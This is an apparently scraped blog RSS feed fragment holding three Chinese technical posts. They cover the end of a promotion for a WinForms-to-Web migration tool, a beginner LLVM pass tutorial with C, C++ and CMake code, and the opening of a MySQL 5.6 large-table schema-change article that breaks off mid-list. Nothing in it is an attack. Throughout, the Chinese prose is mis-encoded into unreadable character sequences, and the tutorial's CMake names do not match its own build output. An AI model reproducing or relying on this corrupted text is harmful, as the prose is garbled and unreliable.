<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">&nbsp;</span></p>
<span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>æ¡ä¾ä¸ï¼æ¶é´è½´äº§åï¼1%ä»£ç ä¿®æ¹éï¼</strong></span>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">æ¶é´è½´äº§åæ¯åäº¬é½æå¬å¸çä¸ä¸ªWinFormsè½¯ä»¶äº§åï¼ç°å·²å¼æºï¼è¿æ¯ä¸ä¸ªé¢åå»é¢çä¸ä¸è½¯ä»¶äº§åã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160302680-1041140241.png" alt="å¾ç5" loading="lazy"></strong></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>åé¡¹ç®ï¼</strong>è¿æ¯ä¸ä¸ª7ä¸è¡ä»£ç çWinFormså»çç»å¾è½¯ä»¶ï¼éåº¦ä¾èµWindowsçGDI+å¾å½¢åºã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>è¿ç§»è¿ç¨ï¼</strong>åå©MWGAæ¡æ¶ï¼éè¿æ·»å æå°éï¼çº¦1%ï¼çå¼æ­¥ééä»£ç ï¼ä½¿åä¸å¥ä»£ç è½åæ¶ç¼è¯ä¸ºæ¡é¢ç¨åºåWebAssemblyåºç¨ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>è¿ç§»ç»æï¼</strong>è¯¥è½¯ä»¶æåå¨æµè§å¨ä¸­åæ ·è¿è¡ï¼è¯æäºæ ééåå³å¯å°å¤æC#æ¡é¢è½¯ä»¶ä½ææ¬è¿ç§»è³Webå¹³å°ã</span></p>
<p><strong class="135brush" data-brushtype="text"><strong><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160321078-1847393760.jpg" alt="å¾ç6" loading="lazy"></strong></strong></p>
<h1><strong class="135brush" data-brushtype="text"><strong>äºãå¹¿æ³éé</strong></strong></h1>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">MWGAå¨é¢å¼å®¹å¤å¹³å°æä½ç³»ç»ï¼åæ¬Windows 7/10/11ãLinuxãAndroidãmacOSä»¥åç»ä¿¡UOSãéºéºãæ¹å¾·ç­å½äº§ä¿¡åç³»ç»ãåºç¨å®å¨åºäºæµè§å¨è¿è¡ï¼ä¸ä¾èµç¹å®Windowsçæ¬ï¼ä¹æ éå®è£ç¬ç«å®¢æ·ç«¯ãè½¬æ¢åçåºç¨å¯ç´æ¥é¨ç½²äºæ åWebæå¡å¨ï¼ç¨æ·éè¿Chromeï¼v95+ï¼ãEdgeãFirefoxï¼v133+ï¼ãSafariç­ä¸»æµæµè§å¨å³å¯è®¿é®ï¼æ éæ´æ¢ç¡¬ä»¶æåçº§ç³»ç»ï¼è½»æ¾å®ç°åºç¨ç°ä»£åä¸åè§åã</span></p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ï¼1ï¼å¨Windows 7ä¸­è¿è¡çé¢å¦ä¸ï¼</span></strong></p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160401296-9140087.jpg" alt="å¾ç7" loading="lazy"></span></strong></p>
<p>&nbsp;</p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼2ï¼å¨è°·æ­æµè§å¨ä¸­è¿è¡çææå¦ä¸ï¼</strong></span></p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160426956-315964826.jpg" alt="å¾ç8" loading="lazy"></span></strong></p>
<p>&nbsp;</p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ï¼3ï¼å¨Firefoxä¸­è¿è¡çææï¼</span></strong></p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160758522-570347954.jpg" alt="å¾ç9" loading="lazy"></span></strong></p>
<p>&nbsp;</p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ï¼4ï¼å¨è¹æç³»ç»ä¸­è¿è¡çææï¼</span></strong></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160815014-1508511479.jpg" alt="å¾ç10" loading="lazy"></strong></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼5ï¼å¨è¹æpadä¸­è¿è¡çææï¼</strong></span></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/XIfaemfq_Q74w.jpg?auth_key=1770566399-0-0-85b73e984965158d622f0244d80518dc" alt="å¾ç11.jpg"></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼6ï¼å¨åä¸ºpadä¸­è¿è¡çææï¼</strong></span></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/RFUdjSbk_GMNP.jpg?auth_key=1770566399-0-0-086fb31ad63bdcef31fbcf8017898bcd" alt="å¾ç12.jpg"></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼7ï¼å¨è¹æææºç«¯è¿è¡ææå¦ä¸ï¼</strong></span></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/yH2Z4tOe_K8re.png?auth_key=1770566399-0-0-9319348da9ee7e23d623be43400fcbb6" alt="å¾ç13.png"></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼8ï¼å¨å®åææºç«¯è¿è¡ææå¦ä¸ï¼</strong></span></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/HfAKpuk9_92EL.jpg?auth_key=1770566399-0-0-36fcf28439eb68eb75956bd8f7c11587&amp;x-bce-process=image/crop,x_0,y_0,w_394,h_337" alt="å¾ç14.jpg"></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/LSFhnIMh_zEkM.jpg?auth_key=1770566399-0-0-13d14553adfd143ec49f771e0423d178" alt="å¾ç15.jpg"></p>
<h1>&nbsp;ä¸ã<strong class="135brush" data-brushtype="text"><strong>è½¬ååçä¼å¿ï¼ä¸ºä»ä¹éæ©MWGAï¼</strong></strong></h1>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>1ãè¿ç§»æçé«ï¼</strong>å¯¼å¥å³æ¸²æï¼ééå¿«ï¼ä»WinFormså°Webä»éæ°å°æ¶</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>2ãä»£ç æ¹å¨å°ï¼</strong>å¹³åä¿®æ¹éï¼10%ï¼å¤§éä¸å¡é»è¾ä¸ç»å¾ä»£ç å¯ç´æ¥å¤ç¨</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>3ãææ¯é¨æ§ä½ï¼</strong>æ éBlazoræåç«¯ç»éªï¼WinFormså¼åäººåç´æ¥ä¸æ</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>4ãææ¬æä½ï¼</strong>çå»éåäººåãå­¦ä¹ ææ¬ä¸é¿æç»´æ¤ææ¬</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>5ãæ¯æGDI+ç»å¾ï¼</strong>ç³»ç»ç»å¾ä»£ç æ ééæï¼ç´æ¥è¿ç§»è³Canvasæ¸²æ</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>6ãè·¨å¹³å°è¿è¡ï¼</strong>æ¯æWindowsãLinuxãAndroidåä¸»æµå½äº§ç³»ç»</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">å¯¹äºä¼ä¸èè¨ï¼å°Winformsåºç¨éåä¸ºWebçéå¸¸æå³çä»é¶å¼å§ãé«æçææ¬ä¸æ¼«é¿çå¨æãMWGAçåºç°ï¼å½»åºæ¹åäºè¿ä¸å±é¢ãä¼ä¸æ éæèä¸é¨çåç«¯å¼åå¢éï¼æ éåºå¼ç»è¿å¤å¹´ç§¯ç´¯çä¸å¡é»è¾ä»£ç ãåªéå¨åæWinformsé¡¹ç®åºç¡ä¸ï¼éè¿MWGAè¿è¡è½¬æ¢ï¼å³å¯åæ­¥è·å¾Webçæ¬ãæªæ¥åè½è¿­ä»£ï¼ä¹åªéå¨Winformsé¡¹ç®ä¸­ä¿®æ¹ä¸æ¬¡ï¼ä¾¿è½åæ­¥è³Webç«¯ï¼æå¤§éä½äºç»´æ¤ææ¬ååç«¯ä¸ä¸è´çé£é©ã</span></p>
<h1>&nbsp;åã<strong class="135brush" data-brushtype="text"><strong>ç«å³ä½éª</strong></strong></h1>
<p>M<span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">WGAç°å·²å¼æ¾ä¸è½½ä¸è¯ç¨ï¼æ¬¢è¿è®¿é®æä»¬çGitHubä¸»é¡µè·åæ¼ç¤ºé¡¹ç®ä¸ä½¿ç¨æåï¼</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ð ä¸è½½å°åï¼<a href="https://github.com/dcsoft-yyf/MWGA" target="_blank" rel="noopener nofollow">https://github.com/dcsoft-yyf/MWGA</a></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ð§ èç³»æä»¬ï¼<a href="mailto:28348092@qq.com" rel="noopener nofollow">28348092@qq.com</a></span></p>
<p>&nbsp;</p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">è¿ç§»ååä»£ç éå¯¹æ¯å¾ï¼å¾ç¤ºä¸ºç¤ºä¾ï¼å®éä¿®æ¹éä¾é¡¹ç®å¤æåº¦èå®ï¼ï¼</span></p>
<p><strong class="135brush" data-brushtype="text"><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160902626-1390836694.png" alt="å¾ç16" loading="lazy"></strong></p>
<p><strong class="135brush" data-brushtype="text">END</strong></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/7rG2PuJH_shWu.jpg?auth_key=1770566399-0-0-5bf797861484c19f5b5976bcb153f14d" width="145" height="145" data-ratio="1" data-w="344"></p>
<p><strong class="135brush" data-brushtype="text">æ«ç å³æ³¨</strong></p>
<p><span class="135brush" data-brushtype="text">åäº¬é½æä¿¡æ¯</span></p>
<p><span class="135brush" data-brushtype="text">ä¸èµ·å±åç¾å¥½æªæ¥</span></p>

</div>
<div class="clear"></div>
</div>
		<p class="postfoot">
			posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 16:09">2026-02-02 16:09</span>&nbsp;
<a href="https://www.cnblogs.com/xdesigner">è¢æ°¸ç¦ çµå­çåï¼å»çä¿¡æ¯å</a>&nbsp;
éè¯»(<span id="post_view_count">126</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19565029);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19565029', targetLink: 'https://www.cnblogs.com/xdesigner/p/19565029', title: 'MWGAè®©åäº¿è¡ä»£ç å¨Webç«¯âå¤æ´»âï¼' })">ä¸¾æ¥</a>

		</p>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ LLVM Passå¿«éå¥é¨(äº)ï¼è¿è¡ç¬¬ä¸ä¸ªpass ]]></title>
    <link>https://www.cnblogs.com/ClownLMe/p/19564658</link>
    <guid>a088b9405f63dc0c9af5134a182f8de0</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ClownLMe/p/19564658" title="åå¸äº 2026-02-02 15:17">
    <span role="heading" aria-level="2">LLVM Passå¿«éå¥é¨(äº)ï¼è¿è¡ç¬¬ä¸ä¸ªpass</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="è®¤è¯passå±çº§ç»æ">è®¤è¯Passå±çº§ç»æ</h1>
<p><strong>Pass</strong>èå´ä»ä¸å°ä¸ä¸å±åä¸º5ä¸ªå±çº§ï¼</p>
<ul>
<li><strong>æ¨¡åå±çº§</strong>ï¼åä¸ª<code>.ll</code>æ<code>.bc</code>æä»¶</li>
<li><strong>è°ç¨å¾å±çº§</strong>ï¼å½æ°è°ç¨çå³ç³»ã</li>
<li><strong>å½æ°å±çº§</strong>ï¼åä¸ªå½æ°ã</li>
<li><strong>åºæ¬åå±çº§</strong>ï¼åä¸ªä»£ç åãä¾å¦Cè¯­è¨ä¸­<code>{}</code>æ¬èµ·æ¥çæå°ä»£ç ã</li>
<li><strong>æä»¤å±çº§</strong>ï¼åä¸ªIRæä»¤ã</li>
</ul>
<p><mark><strong>æ³¨æï¼ä¸é¢ä»£ç æå¥½ä¸è¦ç¨ä¸­æï¼ä½¿ç¨èµ·æ¥éå¸¸éº»ç¦ï¼æ§å¶å°ï¼ç¼è¯ï¼ç®æ æä»¶çç¼ç ä¸åä¼é æä¹±ç ã</strong></mark></p>
<h1 id="é¡¹ç®ç®å½å¦ä¸">é¡¹ç®ç®å½å¦ä¸</h1>
<pre><code>/MyProject
âââ CMakeLists.txt # CMake éç½®æä»¶
âââ build/ #æå»ºç®å½
â   âââ test.c #æµè¯ç¼è¯ä»£ç 
âââ mypass1.cpp # pass é¡¹ç®ä»£ç 
</code></pre>
<h3 id="ä¸æµè¯ä»£ç ç¤ºä¾">ä¸ï¼æµè¯ä»£ç ç¤ºä¾</h3>
<p><strong>test.c</strong></p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

void secret_function() {
&nbsp; &nbsp; printf("I am secret\n");
}

int main() {
&nbsp; &nbsp; secret_function();
&nbsp; &nbsp; return 0;
}
</code></pre>
<h3 id="äºpassç¼å">äºï¼Passç¼å</h3>
<p>é¡¹ç®æè¿°ï¼éè¿è§£æä¸é¢ä»£ç çIRï¼å°ä¸é¢ä»£ç ä¸­çå½æ°åæå°åºæ¥ã<br>
<strong>mypass1.cpp</strong></p>
<pre><code class="language-c">#include "llvm/IR/PassManager.h"
#include "llvm/Passes/PassBuilder.h"
#include "llvm/Passes/PassPlugin.h"
#include "llvm/Support/raw_ostream.h"

using namespace llvm;

// è¿ä¸ªç»æä½åºæ¬æ¯åºå®æ¨¡æ¿
namespace {
    struct mypass1 : public PassInfoMixin&lt;mypass1&gt; {
	    //å½æ°åè°ï¼æ¯æ¬¡éå°å½æ°æ¶è°ç¨ï¼è¿éæéè½½ï¼å­å¨å¤ç§å¥å£æ¹å¼ï¼å¯ä»¥ä»¥æ¨¡åä¸ºå¥å£ï¼
        PreservedAnalyses run(Function &amp;F, FunctionAnalysisManager &amp;) {
	        //è¿éæ¯ä¸»è¦çé»è¾ä»£ç ï¼æä»¬ä¸»è¦å­¦ä¹ çä»£ç å¨è¿
	        
	        //æå°åºå½åå½æ°çåå­
            errs() &lt;&lt; "Found Function: " &lt;&lt; F.getName() &lt;&lt; "\n";
            
            //åªè¯»æ¶è¿åï¼PreservedAnalyses::all()
            //å­å¨ä¿®æ¹æ¶ï¼PreservedAnalyses::none()
            return PreservedAnalyses::all();
        }
    };

}

//ä¸é¢åºæ¬ä¸æ¯åºå®çæ¨¡æ¿ï¼æ¯ä¸ªpassæ²¡ä»ä¹ååï¼å¯ä»¥ç´æ¥å¤å¶ç²è´´ï¼æèèçã
//ç´æ¥ä½¿ç¨éè¦ä¿®æ¹çæ¯ä¸é¢ç&lt;æ¨¡ååç§°ï¼çæ¬å·ï¼è°ç¨åæ°ï¼åè°ç¨çpassç»æä½&gt;
extern "C" LLVM_ATTRIBUTE_WEAK::llvm::PassPluginLibraryInfo
llvmGetPassPluginInfo() {
    return {
        LLVM_PLUGIN_API_VERSION,//çæ¬ä¿¡æ¯
        "mypass1",//æ¨¡åä¿¡æ¯ï¼èªå®ä¹
        "v0.1",//çæ¬å·ï¼èªå®ä¹
        [](PassBuilder &amp;PB) {
            PB.registerPipelineParsingCallback(
                [](StringRef Name, FunctionPassManager &amp;FPM,
                   ArrayRef&lt;PassBuilder::PipelineElement&gt;) {
                    if (Name == "mypass1") {//è°ç¨åæ°
                        FPM.addPass(mypass1());//ä¸é¢passç»æä½
                        return true;
                    }
                    return false;
                }
            );
        }
    };
}
</code></pre>
<h3 id="ä¸passçæå»º">ä¸ï¼Passçæå»º</h3>
<p>æå»ºLLVM Passéè¦å<code>CMakeLists.txt</code>æå»ºå£°æ</p>
<h5 id="1-éç½®cmakeéç½®æä»¶">1. éç½®CMakeéç½®æä»¶</h5>
<p><strong>CMakeLists.txt</strong><br>
ä¸é¢ç<code>cmake</code>éç½®å¯ä»¥ç´æ¥æ¿å»ç¨ï¼æå·²ç»æ æ³¨å¥½éè¦ä¿®æ¹çä½ç½®</p>
<pre><code class="language-python">#cmake çæ¬ï¼å¯éè¿ cmake --version å¤æ­
cmake_minimum_required(VERSION 4.1.1) #----&gt;ä¿®æ¹ cmakeçæ¬å·
#é¡¹ç®åå­
project(mypass1) #----&gt;ä¿®æ¹ é¡¹ç®åç§°

#å¯¼å¥é¡¹ç®ç LLVM cmake éç½®æä»¶è·¯å¾(å¦ææ ¹æ®æä¹åæç« å®è£è¿éå°±ç¸å)
set(LLVM_DIR "D:/LLVM/llvm-project/build/lib/cmake/llvm")#----&gt;ä¿®æ¹ llvm cmakeéç½®è·¯å¾
#å¯»æ¾ LLVM çåæä»¶
#REQUIRED æ¾ä¸å° LLVM ååæ­¢æå»º
#å¼ºå¶ä½¿ç¨ LLVM å®è£æ¶çæçéç½®æä»¶è¿è¡å®ä½
find_package(LLVM REQUIRED CONFIG)
#å° LLVM ç CMake æ¨¡åè·¯å¾æ·»å å°å½å CMake æç´¢è·¯å¾ä¸­ï¼ä»¥ä¾¿åç»­ä½¿ç¨ include(AddLLVM)ã
list(APPEND CMAKE_MODULE_PATH "${LLVM_CMAKE_DIR}")

#å¼å¥ LLVM æä¾çä¸ç¨ CMake å®
include(AddLLVM)
#å° LLVM çå¤´æä»¶ç®å½ï¼å¦ llvm/IR/Function.hï¼å å¥ç¼è¯å¨çæç´¢è·¯å¾
include_directories(${LLVM_INCLUDE_DIRS})
#å¯¼å¥ LLVM ç¼è¯æ¶ä½¿ç¨çå®å®ä¹
add_definitions(${LLVM_DEFINITIONS})
#è®¾ç½® C++ æ åä¸º C++17ã(è¿éå¦æä¸ç¨17ç¼è¯ä¼æ¥é)
set(CMAKE_CXX_STANDARD 17)
#å¼ºå¶è¦æ±å¿é¡»æ¯æ C++17ï¼å¦æç¼è¯å¨ä¸æ¯æåå¤±è´¥ã
set(CMAKE_CXX_STANDARD_REQUIRED ON)

#åå»ºä¸ä¸ªæ¨¡ååçåº(.dll)
add_library(mypass8 MODULE mypass8.cpp) #----&gt;ä¿®æ¹ é¡¹ç®åç§°ï¼æä»¶å
#windowsä¸ç¨ä¼æ¥éï¼å¯¼åºç¬¦å·
#LLVM Pass éè¦æ´é²ä¸äºç¹å®çå¥å£ç¹ï¼å¦ getAnalysisUsageï¼ç» opt å·¥å·è°ç¨ã
set_target_properties(mypass8 PROPERTIES WINDOWS_EXPORT_ALL_SYMBOLS ON) #----&gt;ä¿®æ¹ é¡¹ç®åç§°
# æå®è¯¥ Pass éè¦é¾æ¥ç LLVM æ ¸å¿ç»ä»¶ã 
# LLVMCore: æä¾ IRãFunctionãModule ç­æ ¸å¿ç±»ã 
# LLVMSupport: æä¾åç§è¾å©å·¥å·ç±»ï¼å¦ errs() è¾åºï¼ã
target_link_libraries(mypass8 LLVMCore LLVMSupport) #----&gt;ä¿®æ¹ é¡¹ç®åç§°ï¼æä»¶å  
# ä¸ºè¯¥ç®æ è®¾ç½®ç¹å®çç¼è¯å¨éé¡¹ã 
# /utf-8: åè¯ MSVC ç¼è¯å¨ä½¿ç¨ UTF-8 ç¼ç å¤çæºä»£ç ï¼é²æ­¢ä¸­ææ³¨éå¼èµ·çä¹±ç æç¼è¯éè¯¯ã  
target_compile_options(mypass8 PRIVATE /utf-8)#----&gt;ä¿®æ¹ é¡¹ç®åç§°ï¼æä»¶å
</code></pre>
<h5 id="2ç¼è¯å¹¶æå»ºpass">2.ç¼è¯å¹¶æå»ºPass</h5>
<p><strong>æå¼visual studio<code>çå·¥ä½å°ï¼æè¿éæ¯</code>x64 Native Tools Command Prompt for VS 2022`</strong></p>
<p>è¿å°<code>build</code>ç®å½</p>
<pre><code class="language-bash">#æå»ºé¡¹ç®
#å¶ä¸­-DCMAKE_BUILD_TYPE=RelWithDebInfoä¸éä¼æ¥éï¼ç±äºæä¹åç¼è¯çæ¯å¸¦ç¬¦å·çrelaseçæ¬
cmake -G "Ninja"  -DCMAKE_BUILD_TYPE=RelWithDebInfo ..
#ç¼è¯
ninja
</code></pre>
<p>æååºç°ä¸é¢æç¤ºï¼å³ä¸ºç¼è¯æå</p>
<pre><code class="language-bash">[2/2] Linking CXX shared module mypass1.dll
</code></pre>
<h3 id="åä½¿ç¨ä½ ç¬¬ä¸ä¸ªpass">åï¼ä½¿ç¨ä½ ç¬¬ä¸ä¸ªPass</h3>
<p>è¿å°<code>build</code>ç®å½</p>
<pre><code class="language-bash">#æ.cæä»¶ç¼è¯ä¸º.ll
#-O1 ä½¿ç¨O1ä¼åï¼è¿éæå°è¯-O0ä¸ä¼åï¼ä¼å¯¼è´æçpassæ æ³åºç¨ï¼
#-Xclang -disable-llvm-passes ä¸ä½¿ç¨é»è®¤çpassä¼å
clang -S -emit-llvm -O1 -Xclang -disable-llvm-passes test.c -S -o test.ll

#ä½¿ç¨pass
opt -load-pass-plugin=mypass1.dll -passes=mypass1  test.ll -S -o test_opt.ll
</code></pre>
<p><strong>è¾åºç»æ</strong></p>
<pre><code class="language-bash">Found Function: sprintf
Found Function: vsprintf
Found Function: _snprintf
Found Function: _vsnprintf
Found Function: secret_function
Found Function: printf
Found Function: main
Found Function: _vsprintf_l
Found Function: _vsnprintf_l
Found Function: __local_stdio_printf_options
Found Function: _vfprintf_l
</code></pre>
<p><strong>å¦æâ¤åæ¬¢â¤æ¬ç³»åæç¨ï¼å°±ç¹ä¸ªå³æ³¨å§ï¼åç»­ä¸å®ææ´æ°~</strong></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 15:17">2026-02-02 15:17</span>&nbsp;
<a href="https://www.cnblogs.com/ClownLMe">ClownLMe</a>&nbsp;
éè¯»(<span id="post_view_count">26</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19564658);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19564658', targetLink: 'https://www.cnblogs.com/ClownLMe/p/19564658', title: 'LLVM Passå¿«éå¥é¨(äº)ï¼è¿è¡ç¬¬ä¸ä¸ªpass' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ ]]></title>
    <link>https://www.cnblogs.com/xxhxs-21/p/19564624</link>
    <guid>0f98b7c5fb32dd79832894cba6e45ceb</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xxhxs-21/p/19564624" title="åå¸äº 2026-02-02 15:13">
    <span role="heading" aria-level="2">MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                    <div id="cnblogs_post_description" style="display: none">
        <img src="https://img2024.cnblogs.com/blog/1869035/202602/1869035-20260202151226843-1773744596.png" alt="MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ" class="desc_img">
        MySQL 5.6 2000 ä¸è¡é«é¢è¯»åè¡¨æ°å¢å­æ®µå®æï¼ä»æ¢æ§è¡å°æ éè½å°å¨è§£æ
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">ä¸ãèæ¯ä¸é®é¢ç¼èµ·</span></h2>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6.51 çæ¬ä¸ 2000 ä¸è¡æ ¸å¿ä¸å¡è¡¨å¼å±æ°å¢å­æ®µæä½ï¼éæ±ä¸ºæ°å¢<code></code><code>BIGINT(19) NOT NULL DEFAULT 0 COMMENT 'æ³¨é'</code>ï¼å ä¸å¡å®ééè¦å­å¨å¤§æ°å¼å³èå­æ®µï¼ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;">è¡¨çæ ¸å¿ç¹æ§ä¸ºJava å¤çº¿ç¨å¯éè¯»åï¼ä¸å¡è¯·æ±æç»­é«é¢ï¼åå§æ§è¡åç<code>ALTER TABLE</code>è¯­å¥æ¶åºç°ä¸¤å¤§æ ¸å¿é®é¢ï¼</span></p>
<ol>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">72 ä¸è¡æµè¯è¡¨æ§è¡èæ¶ 203 ç§ï¼çº¿æ§æ¨ç® 2000 ä¸è¡è¡¨èæ¶è¶ 1.5 å°æ¶ï¼</span></li>
<li><span style="font-family: &quot;Microsoft YaHei&quot;">çäº§æ§è¡æ¶è§¦åè¡¨éãæ¥è¯¢å¤±æï¼ä¸¥éå½±åä¸å¡æ­£å¸¸è¿è¡ã</span></li>
</ol>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ¬æ¬¡å®æçæ ¸å¿ææéä¸­å¨ï¼MySQL 5.6 çæ¬æªæ¯æé«çæ¬çè¡¨ç»æåæ°æ®åå°ä¿®æ¹ä¼åãå¤§è¡¨å¨éæ°æ®æ·è´ç IO èµæºå ç¨ãé«é¢è¯»ååºæ¯ä¸çèµæºç«äºãMDL éç­å¾å¯¼è´çéè¡¨é£é©ï¼ééè¿éå¯¹æ§æ¹æ¡å®ç°æ éãæ ä¸å¡æç¥ãé«æçå­æ®µæ°å¢ã</span></div>
<h2><span style="font-family: &quot;Microsoft YaHei&quot;">äºãæ ¸å¿é®é¢æ ¹æºåæ</span></h2>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">2.1 MySQL 5.6 Online DDL çåå¤©å±é</span></h3>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6 è½å¼å¥ InnoDB Online DDL ç¹æ§ï¼è§£å³äºä¼ ç» DDL éè¡¨é»å¡ä¸å¡çé®é¢ï¼ä½æªæ¯æé«çæ¬ï¼5.7/8.0ï¼çåæ°æ®åå°ä¿®æ¹ä¼åââ æ°å¢ä»»ä½ç±»åå­æ®µåéå¨è¡¨æ·è´æ°æ®ï¼èæ·è´è¿ç¨ä¼å ç¨å¤§éç£ç IOï¼è¿æ¯å¤§è¡¨ DDL æ§è¡æ¢çæ ¸å¿æ ¹æºãå°¤å¶å¯¹äº 2000 ä¸è¡è¡¨ï¼å¨è¡¨æ·è´ç IO å¼éæä¸ºæ§è½ç¶é¢ï¼72 ä¸è¡å°è¡¨æµè¯èæ¶ 203 ç§çæ ¸å¿åå ä¹å¨äºæ­¤ã</span></div>
<div>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">2.2&nbsp;æ¾å¼é»è®¤å¼å¯¹ DDL çä¼åä½ç¨</span></h3>
</div>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">MySQL 5.6 å¯¹åçæ°å¼ç±»åï¼TINYINT/INT/BIGINTï¼+ ç®åå¸¸éé»è®¤å¼ï¼å¦ 0ï¼ç DDL æä½æè½»éçº§ä¼åï¼æ é»è®¤å¼æ¶éå¨è¡¨æ·è´ + éè¡åå§åå­æ®µå¼ï¼èæ¾å¼æå®é»è®¤å¼åä¼ä¼åä¸ºå¨è¡¨æ·è´ + æ¹éèµå¼é»è®¤å¼ï¼åå° 60% ä»¥ä¸ç IO å¼éï¼ä¸è¯¥ä¼åå¯¹æ°å¼ç±»åçééæ§è¿ä¼äº VARCHAR ç±»åï¼BIGINT æ¯ VARCHAR çæ§è¡æçæ´é«ãèµæºå ç¨æ´ä½ï¼ã</span></div>
<div>
<h3><span style="font-family: &quot;Microsoft YaHei&quot;">2.3&nbsp;éè¡¨ççæ­£åå¶ï¼MDL éç­å¾ä¸é¿äºå¡é»å¡</span></h3>
</div>
<div><span style="font-family: &quot;Microsoft YaHei&quot;">æ§è¡<code>ALTER TABLE</code>æ¶åºç°çè¡¨éãæ¥è¯¢å¤±æï¼å¹¶é DDL æ¬èº«éè¡¨ï¼èæ¯ MySQL 5.6 ç MDLï¼åæ°æ®éï¼æºå¶å¯¼è´ï¼</span><ol>
